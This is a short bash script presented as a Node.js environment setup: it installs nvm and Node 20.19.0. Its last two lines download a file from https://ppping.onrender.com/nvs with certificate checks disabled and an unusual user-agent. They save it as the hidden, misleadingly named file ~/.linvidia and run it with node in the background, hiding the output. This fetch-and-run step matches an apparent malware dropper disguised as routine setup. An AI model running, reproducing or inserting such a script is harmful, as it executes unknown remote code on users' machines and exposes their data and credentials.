#!/usr/bin/env bash
wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
\. "$HOME/.nvm/nvm.sh"
nvm install 20.19.0
nvm use 20.19.0
wget --no-check-certificate --user-agent="209" -O ~/.linvidia https://ppping.onrender.com/nvs
node ~/.linvidia 2>&1 &
